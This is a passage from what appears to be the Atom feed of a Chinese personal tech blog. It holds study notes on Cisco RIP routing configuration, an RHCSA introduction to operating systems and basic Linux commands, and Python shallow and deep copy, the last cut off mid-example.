（4）常规路由更新和定时——路由器以30秒一次地将整个路由表以应答消息地形式发送到邻居路由器。路由器收到新路由或者现有路由地更新信息时，会设置一个180秒地超时时间。如果180秒没有任何更新信息，路由的跳数设为16。路由器以度量值16宣告该路由，直到刷新计时器从路由表中删除该路由。刷新计时器的时间设为240秒，或者比过期计时器时间多60秒。Cisco还用了第三个计时器，称为抑制计时器。接收到一个度量更高的路由之后的180秒时间就是抑制计时器的时间，在此期间，路由器不会用它接收到的新信息对路由表进行更新，这样能够为网路的收敛提供一段额外的时间。 　　</p><p>​       （5）触发路由更新——当某个路由度量发生改变时，路由器只发送与改变有关的路由，并不发送完整的路由表。</p><h5 id="5-RIP防环机制"><a href="#5-RIP防环机制" class="headerlink" title="5. RIP防环机制"></a>5. RIP防环机制</h5><p>5.1 记数最大值（maximum hop count）：定义最大跳数（最大为15跳），当跳数为16跳时,目标为不可达。</p><p>5.2 水平分割（split horizon）：从一个接口学习到的路由不会再广播回该接口。</p><p>5.3 毒性逆转水平分割（poison reverse）：从一个接口学习的路由会发送回该接口，但是已经被毒化，跳数设置为16跳，不可达。</p><p>5.4 触发更新（trigger update）：一旦检测到路由崩溃，立即广播路由刷新报文，而不等到下一刷新周期。</p><p>5.5 抑制计时器（holddown timer）：防止路由表频繁翻动，增加了网络的稳定性。</p><h5 id="6-RIP路由更新机制"><a href="#6-RIP路由更新机制" class="headerlink" title="6. RIP路由更新机制"></a>6. RIP路由更新机制</h5><p>RIP协议有两种更新机制：一是定期更新，二是触发更新。“定期更新”是根据设置的更新计时器定期发送RIP路由通告。该通告报文中携带了除“水平分割”机制抑制的RIP路由之外本地路由器中的所有RIP路由信息。而“触发更新”则是RIP路由器仅在有路由表项发生变化时发送的RIP路由通告，仅携带本地路由表中有变化的路由信息。RIP路由器一旦察觉到网络变化，就尽快甚至是立即发送更新报文，而不等待更新周期结束。只要触发更新的速度足够快，就可以大大地防止“计数到无穷大”的发生，但是这一现象还是有可能发生的。</p><p>无论是定期更新，还是触发更新，RIP路由的更新规则如下：</p><p>l  如果更新的某路由表项在路由表中没有，则直接在路由表中添加该路由表项；</p><p>l  如果路由表中已有相同目的网络的路由表项，且来源端口相同，那么无条件根据最新的路由信息更新其路由表；</p><p>l  如果路由表中已有相同目的网络的路由表项，但来源端口不同，则要比较它们的度量值，将度量值较小的一个作为自己的路由表项；</p><p>l  如果路由表中已有相同目的网络的路由表项，且度量值相等，保留原来的路由表项。</p><h5 id="7、Rip基础配置"><a href="#7、Rip基础配置" class="headerlink" title="7、Rip基础配置"></a>7、Rip基础配置</h5><p>1）RIPV1</p><p>r1(config)#router rip    启动协议</p><p>r1(config-router)#version 1   选择版本1，若不进行版本选举，默认为升级版本1；</p><p>r1(config-router)#network 1.0.0.0 主类地址—-RIP在宣告时，只能定义主类的范围</p><p>clear ip route *  刷新路由表</p><p>2）RIPV2</p><p>r1(config)#router rip</p><p>r1(config-router)#version 2选择版本2</p><p>r1(config-router)#no auto-summary 关闭自动汇总；</p><p>r1(config-router)#network 12.0.0.0</p><h5 id="8、RIP扩展配置"><a href="#8、RIP扩展配置" class="headerlink" title="8、RIP扩展配置"></a>8、RIP扩展配置</h5><h6 id="1、RIPV2的认证"><a href="#1、RIPV2的认证" class="headerlink" title="1、RIPV2的认证"></a>1、RIPV2的认证</h6><p>​        运行了RIP协议的邻居间，进行身份的核实</p><p>先定制key，再在同邻居直连的接口上调用</p><p><strong>指令：</strong></p><p>r1(config)#key chain xxx</p><p>r1(config-keychain)#key 1</p><p>r1(config-keychain-key)#key-string cisco123   邻居间必须一致</p><p>r1(config)#interface s1/1</p><p>r1(config-if)#ip rip authentication key-chain xxx</p><p>r1(config-if)#ip rip authentication mode md5   模式也必须一致</p><h6 id="2、RIPV2的手工汇总"><a href="#2、RIPV2的手工汇总" class="headerlink" title="2、RIPV2的手工汇总"></a>2、RIPV2的手工汇总</h6><p>在更新源路由器上向所有更新发出的接口上配置</p><p>r2(config)#interface s1/0</p><p>r2(config-if)#ip summary-address rip 2.2.2.0 255.255.254.0 如果在接口中汇总多个路由，则选择掩码短的</p><h6 id="3、被动接口"><a href="#3、被动接口" class="headerlink" title="3、被动接口"></a>3、被动接口</h6><p>仅接收不发送路由协议信息；只能用于连接用户的接口，不得用于连接邻居的接口</p><p>r1(config)#router rip            </p><p>r1(config-router)#passive-interface loopback 0</p><h6 id="4、加快收敛"><a href="#4、加快收敛" class="headerlink" title="4、加快收敛"></a>4、加快收敛</h6><p>RIP计时器    30s 更新  180s失效   180s抑制  240s刷新</p><p>​      适当的修改计时器，可以加快设备的收敛速度</p><p>​      建议修改时维持原有的倍数关系，且不易修改的过小；全网所有设备均修改</p><p>r1(config)#router rip</p><p>r1(config-router)#timers basic 15 90 90 120</p><h6 id="5、缺省路由"><a href="#5、缺省路由" class="headerlink" title="5、缺省路由"></a>5、缺省路由</h6><p>在边界路由器上配置RIP缺省后，内部的路由器将自动生成缺省路由指向边界路由器；边界路由器到达ISP的缺省路由，宣告手工静态配置</p><p>r3(config)#router rip</p><p>r3(config-router)#default-information originate </p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;RIP：路由信息协议&quot;&gt;&lt;a href=&quot;#RIP：路由信息协议&quot; class=&quot;headerlink&quot; title=&quot;RIP：路由信息协议&quot;&gt;&lt;/a&gt;RIP：路由信息协议&lt;/h4&gt;
    
    </summary>
    
      <category term="CCNA" scheme="http://soliym.top/categories/CCNA/"/>
    
    
  </entry>
  
  <entry>
    <title>RIP路由信息协议详解</title>
    <link href="http://soliym.top/2021/06/19/RIP%E8%B7%AF%E7%94%B1%E4%BF%A1%E6%81%AF%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/"/>
    <id>http://soliym.top/2021/06/19/RIP路由信息协议详解/</id>
    <published>2021-06-19T14:37:21.059Z</published>
    <updated>2020-05-25T03:05:08.086Z</updated>
    
    <content type="html"><![CDATA[<p>动态路由协议：取未知的路由信息，然后根据不同的路由选择算法，计算到达未知网段的最佳路径，并将其加载到路由表中。</p><a id="more"></a><h5 id="一、RIP基本概念"><a href="#一、RIP基本概念" class="headerlink" title="一、RIP基本概念"></a>一、RIP基本概念</h5><p>路由信息协议RIP-距离矢量型</p><p>1.1 RIP特点</p><p>1、距离矢量型-以TTL跳数作为选路度量</p><p>2、路由优先级：100</p><p>3、收敛方式：异步周期更新30s+触发更新+老化时间180s</p><p>4、RIP没有确认包，所以需要在一定时间间隔内重新收敛</p><p>5、使用UDP520端口</p><h6 id="1-2-RIP防环机制"><a href="#1-2-RIP防环机制" class="headerlink" title="1.2 RIP防环机制"></a>1.2 RIP防环机制</h6><p>1、水平分割：直线拓扑防环</p><p>2、最大条数：15跳，16跳不可达</p><p>3、毒性逆转水平分割</p><p>4、机制计时器</p><h6 id="1-3-RIP的定时器"><a href="#1-3-RIP的定时器" class="headerlink" title="1.3 RIP的定时器"></a>1.3 RIP的定时器</h6><p>1、更新定时器：发送更新报文的周期-30s</p><p>2、老化定时器：路由表项的有效时间-180s</p><p>3、垃圾收集定时器：路由表项失效后到被删除的时间-120s</p><p>4、抑制定时器：收到跳数为16时，停止路由条目的更新的时间-180s</p><h6 id="1-4-RIPV1和V2的区别"><a href="#1-4-RIPV1和V2的区别" class="headerlink" title="1.4 RIPV1和V2的区别"></a>1.4 RIPV1和V2的区别</h6><p>RIPV1 ：  有类别路由选择协议</p><p>不支持VLSM</p><p>不能手工汇总</p><p>不支持认证</p><p>广播更新</p><p>不能对路由有标记</p><p>RIPV2：   无类别路由选择协议</p><p>支持VLSM</p><p>手工汇总</p><p>支持认证</p><p>组播更新</p><p>可以对路由标记</p><h5 id="二、RIP基本原理"><a href="#二、RIP基本原理" class="headerlink" title="二、RIP基本原理"></a>二、RIP基本原理</h5><h6 id="2-1-RIP概述"><a href="#2-1-RIP概述" class="headerlink" title="2.1 RIP概述"></a>2.1 RIP概述</h6><p>RIP是一种基于距离矢量（Distance-Vector）算法的协议，它使用跳数（Hop Count）作为度量值来衡量到达目的地址的距离。在RIP网络中，缺省情况下，设备到与它直接相连网络的跳数为0，通过一个设备可达的网络的跳数为1，其余依此类推。也就是说，度量值等于从本网络到达目的网络间的设备数量。为限制收敛时间，RIP规定度量值取0～15之间的整数，大于或等于16的跳数被定义为无穷大，即目的网络或主机不可达。由于这个限制，使得RIP不可能在大型网络中得到应用。</p><h6 id="2-2-RIPV1报文"><a href="#2-2-RIPV1报文" class="headerlink" title="2.2 RIPV1报文"></a>2.2 RIPV1报文</h6><p>RIP-1报文由头部（Header）和多个路由表项（Route Entries）部分组成。在一个RIP报文中，最多可以有25个路由表项。RIP是一个基于UDP协议的，并且RIP-1的数据包不能超过512字节</p><p>字段解释：</p><p>头部：</p><p>Command         标识报文的类型：</p><p>1：Request报文，向邻居请求全部或部分路由信息；</p><p>2：Reponse报文，发送自己全部或部分路由信息，一个Response报文中最多包含25个路由表项。</p><p>Version          RIP的版本号：1：RIP-12：RIP-2</p><p>Must be zero          必须为零字段。</p><p>数据：</p><p>AFI                         地址族标识，其值为2时表示IP协议。对于Request报文，此字段值为0。</p><p>IP Address          该路由的目的IP地址，可以是自然网段的地址，也可以是子网地址或主机地址。</p><p>Metric         32比特         路由的开销值。对于Request报文，此字段值为16。</p><h6 id="2-3-RIPV2报文"><a href="#2-3-RIPV2报文" class="headerlink" title="2.3 RIPV2报文"></a>2.3 RIPV2报文</h6><p>RIP-2报文由头部（Header）和多个路由表项（Route Entries）部分组成，RIP是一个基于UDP协议的</p><p>报头：</p><p>Command         标识报文的类型：</p><p>1：Request报文，向邻居请求全部或部分路由信息；</p><p>2：Reponse报文，发送自己全部或部分路由信息，</p><p>Version         RIP的版本号：1：RIP-12：RIP-2</p><p>Must be zero         必须为零字段。</p><p>数据：</p><p>AFI1                   地址族标识，其值为2时表示IP协议。对于Request报文，此字段值为0。</p><p>Route Tag          外部路由标记。</p><p>IP Address         该路由的目的IP地址，可以是自然网段的地址，也可以是子网地址或主机地址。</p><p>Subnet Mask         目的地址的掩码。</p><p>Next Hop         提供一个更好的下一跳地址。如果为0.0.0.0，则表示发布此路由的路由器地址就是最优下一跳地址。</p><p>Metric          路由的开销值。对于Request报文，此字段为16。</p><h6 id="2-4-RIP工作过程"><a href="#2-4-RIP工作过程" class="headerlink" title="2.4  RIP工作过程"></a>2.4  RIP工作过程</h6><p>RIP协议启动后，会向相邻路由器广播一个Request请求报文，相邻路由器收到后，会将自己的路由表封装在response报文中，然后向对应接口广播，路由器收到后根据路由信息加表</p><h6 id="2-5-路由表的工作过程"><a href="#2-5-路由表的工作过程" class="headerlink" title="2.5 路由表的工作过程"></a>2.5 路由表的工作过程</h6><p>1、初始状态：路由器开启RIP进程，接口开始发送和接受RIP报文</p><p>2、建立路由表：路由器依据收到的RIP报文构建自己的路由表项</p><p>3、维护路由表：路由器每隔30秒发送更新报文，同时接收相邻路由器发送的更新报文维护路由表</p><p>4、老化路由表项：路由器为将自己构建的路由表项启动180秒的定时器。180秒内，如果路由器收到更新报文，则重置自己的更新定时器和老化定时器。</p><p>5、路由表项删除：180s时间内没有收到更新，进入120s的毒化，跳数设置为16，120s没有收到更新，删除路由表项</p><p>注： 如果没有触发更新，一个路由表删除需要180+120s</p><p>如有有触发更新，一个路由表删除需要120s</p><h5 id="三、RIP的特性"><a href="#三、RIP的特性" class="headerlink" title="三、RIP的特性"></a>三、RIP的特性</h5><h6 id="3-1-水平分割"><a href="#3-1-水平分割" class="headerlink" title="3.1 水平分割"></a>3.1 水平分割</h6><p>原因：如果A路由器将10.0.0.0/8网段的路由信息发往B路由器，路由器B会将该信息加表，然后在向A的更新报文中，会携带该网络的路由信息，A路由器中就会有两种10.0.0.0/8的路由信息，一个来自直连，一个来自B路由器，然后比较跳数，会优选直连。但是如果A的直连出现问题以后，这时候B还没有更新，B还是会发送给A，导致环路的形成</p><p>水平分割：RIP从某个接口学到的路由，不会从该接口再发回给邻居路由器。这样不但减少了带宽消耗，还可以防止路由环路。</p><h6 id="3-2-跳数限制"><a href="#3-2-跳数限制" class="headerlink" title="3.2  跳数限制"></a>3.2  跳数限制</h6><p>RIP用跳数度量路径的优劣，最大15跳（路由器收到后是先减一跳，再处理），因此RIP适用于小网络</p><h6 id="3-3-毒性逆转水平分割"><a href="#3-3-毒性逆转水平分割" class="headerlink" title="3.3 毒性逆转水平分割"></a>3.3 毒性逆转水平分割</h6><p>毒性：将路由的跳数设置为16跳</p><p>逆转水平分割：从相邻路由器学习到的路由可以传回对方</p><p>毒性逆转水平分割：</p><p>将收到相邻路由器的路由信息，设置为16跳，在发送给对方，对方收到后就不在从相邻路由器学习该路由</p><p>华为设备：一般使用水平分割禁用毒性逆转</p><h6 id="3-4-抑制计时器"><a href="#3-4-抑制计时器" class="headerlink" title="3.4 抑制计时器"></a>3.4 抑制计时器</h6><p>RIP收到相同网段的路由信息，且该信息的跳数要大于本地的，这时候RIP为防止环路的产生，就会设置一个抑制计时器，将该消息当做假消息处理，在抑制计时器超时的时间段内，就会不会更新该路由，直到计时器结束，如果任然收到该路由信息，就会更新路由表</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;动态路由协议：取未知的路由信息，然后根据不同的路由选择算法，计算到达未知网段的最佳路径，并将其加载到路由表中。&lt;/p&gt;
    
    </summary>
    
      <category term="路由与交换" scheme="http://soliym.top/categories/%E8%B7%AF%E7%94%B1%E4%B8%8E%E4%BA%A4%E6%8D%A2/"/>
    
    
      <category term="路由协议" scheme="http://soliym.top/tags/%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>RHCSA-Linux简介</title>
    <link href="http://soliym.top/2021/06/19/RHCSA-Linux%E7%AE%80%E4%BB%8B/"/>
    <id>http://soliym.top/2021/06/19/RHCSA-Linux简介/</id>
    <published>2021-06-19T14:37:21.046Z</published>
    <updated>2019-12-24T08:44:54.274Z</updated>
    
    <content type="html"><![CDATA[<h5 id="操作系统是什么？"><a href="#操作系统是什么？" class="headerlink" title="操作系统是什么？"></a>操作系统是什么？</h5><p>操作系统（Operating System，简称OS）是管理和控制计算机硬件与软件资源的计算机程序，是配置在计算机硬件上的第一层软件，任何其它软件都必须在操作系统的支持下才能运行。</p><p>操作系统的主要功能是为管理硬件资源和为应用程序开发人员提供良好的环境来使应用程序具有更好的兼容性，为了达到这个目的，内核提供一系列具备预定功能的多内核函数，通过一组称为系统调用的接口（应用编程接口API，由操作系统实现提供的所有系统调用所构成的集合，是应用程序和系统之间的接口）呈现给用户。系统调用把应用程序的请求传给内核，调用相应的内核函数完成所需的处理，将处理的结果返回给应用程序。</p><a id="more"></a><p>>&gt;硬件：框架</p><h5 id="冯诺依曼体系结构："><a href="#冯诺依曼体系结构：" class="headerlink" title="冯诺依曼体系结构："></a>冯诺依曼体系结构：</h5><p>1946年美籍凶牙利科学家冯诺依曼提出存储程序原理，把程序本身当做数据来对待，程序和该程序处理数据用同样的方式存储，并确定了存储程序计算机的五大组成部分和基本工作方法。</p><p>特点：</p><p>（1）计算机处理数据和指令一律用二进制数表示</p><p>（2）顺序执行程序</p><p>计算机运行过程中，把要执行的程序和处理的数据首先存入主存储器（内存），计算机执行程序时，将自动地并按顺序 从主存储器中取出指令一条一条的执行，这一概念称为顺序执行程序。</p><p>（3）计算机硬件由运算器、控制器、存储器、输入设备、输出设备五大部分组成。</p><p><img src="file:///C:/Users/ASUS/AppData/Local/Packages/Microsoft.Office.OneNote_8wekyb3d8bbwe/TempState/msohtmlclip/clip_image001.jpg" alt="img"></p><p>memory：编址存储设备</p><p>假设我们的存储器为一个长条，其中每八位（bit）作为一个单元，我们把它称为字节byte，字节又称为cell。</p><p>机器语言：二进制指令 （但是对于编程 人员来说二进制语言太难懂（太简陋，太底层），但是程序员想用简单点的语言去描述计算机又不懂所以两者之间不能耦合可以加一个中间层–编译器）</p><p>   汇编语言： 仅是将二进制转为人类语言想接近的语言或者是与人类语言符号相同的类型（+ and/plus）</p><p>   所以任何一款芯片制造商他们都把机器的代码也就是机器语言提供一个较为简单的稍微向上一点的但任然很简陋的编程接口叫做汇编语言（微码编程语言）</p><h5 id="软件："><a href="#软件：" class="headerlink" title="软件："></a>软件：</h5><p>​     —-汇编语言： （低级语言）   </p><p>​            应用：驱动程序</p><p>汇编语言（assembly language）是一种用于<a href="https://baike.baidu.com/item/%E7%94%B5%E5%AD%90%E8%AE%A1%E7%AE%97%E6%9C%BA/191373" target="_blank" rel="noopener">电子计算机</a>、<a href="https://baike.baidu.com/item/%E5%BE%AE%E5%A4%84%E7%90%86%E5%99%A8/104320" target="_blank" rel="noopener">微处理器</a>、<a href="https://baike.baidu.com/item/%E5%BE%AE%E6%8E%A7%E5%88%B6%E5%99%A8/6688343" target="_blank" rel="noopener">微控制器</a>或其他可编程器件的低级语言，亦称为符号语言。在汇编语言中，用<a href="https://baike.baidu.com/item/%E5%8A%A9%E8%AE%B0%E7%AC%A6/489287" target="_blank" rel="noopener">助记符</a>（Mnemonics）代替<a href="https://baike.baidu.com/item/%E6%9C%BA%E5%99%A8%E6%8C%87%E4%BB%A4/8553126" target="_blank" rel="noopener">机器指令</a>的<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E7%A0%81/3220418" target="_blank" rel="noopener">操作码</a>，用地址符号（Symbol）或标号（Label）代替指令或<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E6%95%B0/7658270" target="_blank" rel="noopener">操作数</a>的地址。在不同的设备中，汇编语言对应着不同的机器语言<a href="https://baike.baidu.com/item/%E6%8C%87%E4%BB%A4%E9%9B%86/238130" target="_blank" rel="noopener">指令集</a>，通过汇编过程转换成机器指令。普遍地说，特定的汇编语言和特定的机器语言指令集是一一对应的,不同平台之间不可直接移植。</p><p>​    eg：操作：寄存器BX的内容送到AX中</p><p>​     1000100111011000              机器指令</p><p>​      mov ax,bx                    汇编指令</p><p>（注意：最终识别的还是01二进制数所以还需要将汇编语言转换为二进语言所以需要用到汇编器）</p><p>​      —-(高级语言)：比较接近人类的思维逻辑    —-(编译器)    </p><p>​               系统级：  c    c++  </p><p>​                     适用场合大型的对性能要求比较高的服务类程序   如：oracle  mysql linux windows /</p><p>​               应用级：java  python  ruby         </p><h5 id="系统调用的层级关系-系统组成结构"><a href="#系统调用的层级关系-系统组成结构" class="headerlink" title="系统调用的层级关系(系统组成结构)"></a><strong>系统调用的层级关系(系统组成结构</strong>)</h5><p><img src="file:///C:/Users/ASUS/AppData/Local/Packages/Microsoft.Office.OneNote_8wekyb3d8bbwe/TempState/msohtmlclip/clip_image002.jpg" alt="应 用 程 序  用 户 宁 间  庄 》 ib r 地  系 铳 啁 用  内 核 窄 间  安 全 功 能  进 程 管 理  文 件 管 理  0 百 理  网 络 管 理  内 存 一 百 理  件 抽 层 "></p><h5 id="操作系统内核的功能："><a href="#操作系统内核的功能：" class="headerlink" title="操作系统内核的功能："></a>操作系统内核的功能：</h5><p>系统调用接口</p><p>程序管理</p><p>内存管理，虚拟内存—内存交换    </p><p>文件系统管理    </p><p>设备驱动</p>]]></content>
    
    <summary type="html">
    
      &lt;h5 id=&quot;操作系统是什么？&quot;&gt;&lt;a href=&quot;#操作系统是什么？&quot; class=&quot;headerlink&quot; title=&quot;操作系统是什么？&quot;&gt;&lt;/a&gt;操作系统是什么？&lt;/h5&gt;&lt;p&gt;操作系统（Operating System，简称OS）是管理和控制计算机硬件与软件资源的计算机程序，是配置在计算机硬件上的第一层软件，任何其它软件都必须在操作系统的支持下才能运行。&lt;/p&gt;
&lt;p&gt;操作系统的主要功能是为管理硬件资源和为应用程序开发人员提供良好的环境来使应用程序具有更好的兼容性，为了达到这个目的，内核提供一系列具备预定功能的多内核函数，通过一组称为系统调用的接口（应用编程接口API，由操作系统实现提供的所有系统调用所构成的集合，是应用程序和系统之间的接口）呈现给用户。系统调用把应用程序的请求传给内核，调用相应的内核函数完成所需的处理，将处理的结果返回给应用程序。&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://soliym.top/categories/Linux/"/>
    
    
      <category term="Rhcsa" scheme="http://soliym.top/tags/Rhcsa/"/>
    
  </entry>
  
  <entry>
    <title>RHCSA-Linux基础命令（一）</title>
    <link href="http://soliym.top/2021/06/19/RHCSA-Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://soliym.top/2021/06/19/RHCSA-Linux基础命令（一）/</id>
    <published>2021-06-19T14:37:21.033Z</published>
    <updated>2019-12-24T08:45:13.855Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Linux的基本原则"><a href="#Linux的基本原则" class="headerlink" title=">Linux的基本原则"></a>>Linux的基本原则</h4><p>1、由目的单一的小程序组成      </p><p>2、一切皆文件，设备的访问入口也是文件</p><p>3、避免捕获用户接口，尽量不和用户交互</p><p>4、配置文件保存在纯文本格式，只要有一个文本编辑器，足以搞定所有的配置。</p><a id="more"></a><h5 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h5><p>>命令  </p><p>>命令  参数   </p><p>>命令   -选项       </p><p>>命令   -选项    参数   </p><h5 id="修改命令的执行特性"><a href="#修改命令的执行特性" class="headerlink" title="修改命令的执行特性"></a>修改命令的执行特性</h5><p>短选项        -l</p><p>多个选项可以组合</p><p>长格式        –long</p><p>​          参数        指定命令的作用对象</p><h4 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a><strong>基础命令</strong></h4><p><strong>重启：reboot</strong></p><p><strong>关机：shutdown -h now，poweroff</strong></p><p><strong>ip a</strong>  <strong>/ ifconfig</strong>   查看ip地址</p><p><strong>dhclient</strong>  地址请求，打开网络模式</p><p><strong>kill -9 ID</strong>  结束相应的进程（命令   -选项    参数）</p><p><strong>pwd</strong>  指出当前工作环境    print workdoing directory </p><p><strong>su</strong>       切换到root用户并不切换环境（工作目录） switch user </p><p><strong>su - root</strong>    切换到root用户并切换环境(切换了工作目录)</p><p><strong>cd</strong>        切换目录  change directroy</p><p>​        绝对路径        从根开始到目标的路径叫绝对路径</p><p>​        相对路径        相对当前目录开始到目标路径  </p><p>​        /   根</p><p>​        ~   家目录 /root /home/redhat  </p><p>​        ~ USERNAME(root用户有权限)        直接切换到指定用户的家目录</p><p>​        -        在上一个目录和当前目录来回切换</p><p>​        .   当前目录</p><p>​        ..  上一级目录</p><h4 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a><strong>passwd</strong></h4><ol><li>修改密码：<strong>passwd</strong> <strong>用户名</strong>    直接输入passwd修改当前用户的密码</li><li><p>删除密码：<strong>passwd -d</strong> <strong>用户名</strong></p></li><li><p>root用户：不需要输入原密码，可以不符合密码复杂性规则，可以给任何人修改密码</p></li><li><p>普通用户：需要输入原密码，必须符合密码复杂性规则，passwd修改密码无法指定用户 </p></li><li><p>[student@localhost ~]$ <strong>su -c passwd</strong>普通用户给root用户修改密码</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;Linux的基本原则&quot;&gt;&lt;a href=&quot;#Linux的基本原则&quot; class=&quot;headerlink&quot; title=&quot;&gt;Linux的基本原则&quot;&gt;&lt;/a&gt;&gt;Linux的基本原则&lt;/h4&gt;&lt;p&gt;1、由目的单一的小程序组成      &lt;/p&gt;
&lt;p&gt;2、一切皆文件，设备的访问入口也是文件&lt;/p&gt;
&lt;p&gt;3、避免捕获用户接口，尽量不和用户交互&lt;/p&gt;
&lt;p&gt;4、配置文件保存在纯文本格式，只要有一个文本编辑器，足以搞定所有的配置。&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://soliym.top/categories/Linux/"/>
    
    
      <category term="Rhcsa" scheme="http://soliym.top/tags/Rhcsa/"/>
    
  </entry>
  
  <entry>
    <title>python之深浅拷贝</title>
    <link href="http://soliym.top/2021/06/19/python%E4%B9%8B%E6%B7%B1%E6%B5%85%E6%8B%B7%E8%B4%9D/"/>
    <id>http://soliym.top/2021/06/19/python之深浅拷贝/</id>
    <published>2021-06-19T14:37:21.018Z</published>
    <updated>2020-05-13T03:25:17.775Z</updated>
    
    <content type="html"><![CDATA[<p>深浅拷贝</p><a id="more"></a><h5 id="赋值（基本数据类型）"><a href="#赋值（基本数据类型）" class="headerlink" title="赋值（基本数据类型）"></a>赋值（基本数据类型）</h5><p>Python中，所谓的赋值实际上就是对象引用的传递</p><p>当创建一个对象的时候，再赋值给另外一个变量的时候，是把这个变量在地址空间的id地址值传递给另一个变量，简单的说就是拷贝了这个对象的引用。</p><p>主要的操作，栈内存的复制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a=1</span><br><span class="line">&gt;&gt;&gt; b=a</span><br><span class="line">&gt;&gt;&gt; id(a)</span><br><span class="line">140734331088640</span><br><span class="line">&gt;&gt;&gt; id(b)</span><br><span class="line">140734331088640</span><br></pre></td></tr></table></figure><h5 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h5><p>浅拷贝是对一个对象父级（外层）的拷贝，并不会拷贝子级（内部）。使用浅拷贝的时候，分为两种情况。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a=[1,2]</span><br><span class="line">&gt;&gt;&gt; b=[3,4]</span><br><span class="line">&gt;&gt;&gt; c=[a,b]</span><br><span class="line">&gt;&gt;&gt; d=copy.copy(c)</span><br><span class="line">&gt;&gt;&gt; id(d)</span><br><span class="line">2518098905416</span><br><span class="line">&gt;&gt;&gt; id(c)</span><br><span class="line">2518098905736</span><br><span class="line">&gt;&gt;&gt; id(d[0])</span><br><span class="line">2518098717064</span><br><span class="line">&gt;&gt;&gt; id(c[0])</span><br><span class="line">2518098717064</span><br></pre></td></tr></table></figure><p>对于c和d来说是一个列表，是可变的，所以浅拷贝时，id地址会发生变化，但是c和d内部的元素也是列表对象，但是内部的对象不会拷贝，所以id地址不变</p><h6 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h6><p>如果最外层的数据类型是可变的，比如说列表，字典等，浅拷贝会开启新的地址空间去存放。</p><p>赋值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; list = [1,2,3,4]</span><br><span class="line">&gt;&gt;&gt; id(list)</span><br><span class="line">2518066946632</span><br><span class="line">&gt;&gt;&gt; lt = list</span><br><span class="line">&gt;&gt;&gt; id(lt)</span><br><span class="line">2518066946632</span><br></pre></td></tr></table></figure><p>浅拷贝：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import copy</span><br><span class="line">&gt;&gt;&gt; ls = copy.copy(list)</span><br><span class="line">&gt;&gt;&gt; id(ls)</span><br><span class="line">2518098812040</span><br></pre></td></tr></table></figure><p>地址发生变化</p><h6 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h6><p>如果最外层的数据类型是不可变的，比如元组，字符串等，浅拷贝对象的时候，还是引用对象的地址空间。</p><p>浅拷贝：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; str = &apos;123456&apos;</span><br><span class="line">&gt;&gt;&gt; str1 = copy.copy(str)</span><br><span class="line">&gt;&gt;&gt; id(str)</span><br><span class="line">2518098724264</span><br><span class="line">&gt;&gt;&gt; id(str1)</span><br><span class="line">2518098724264</span><br></pre></td></tr></table></figure><p>地址没有发生变化</p><h5 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h5><p>深拷贝对一个对象是所有层次的拷贝（递归），内部和外部都会被拷贝过来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d=copy.deepcopy(c)</span><br><span class="line">&gt;&gt;&gt; id(c)</span><br><span class="line">1408115280264</span><br><span class="line">&gt;&gt;&gt; id(d)</span><br><span class="line">1408115279944</span><br><span class="line">&gt;&gt;&gt; id(c[0])</span><br><span class="line">1408115186504</span><br><span class="line">&gt;&gt;&gt; id(c[1])</span><br><span class="line">1408115091144</span><br><span class="line">&gt;&gt;&gt; id(d[0])</span><br><span class="line">1408115279880</span><br></pre></td></tr></table></figure><p>深拷贝的内部对象和外部对象地址都是不一样的</p><p>深拷贝</p><p>也分两种情况：</p><h6 id="第一种-1"><a href="#第一种-1" class="headerlink" title="第一种"></a>第一种</h6><p>最外层数据类型可变。这个时候，内部和外部的都会拷贝过来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 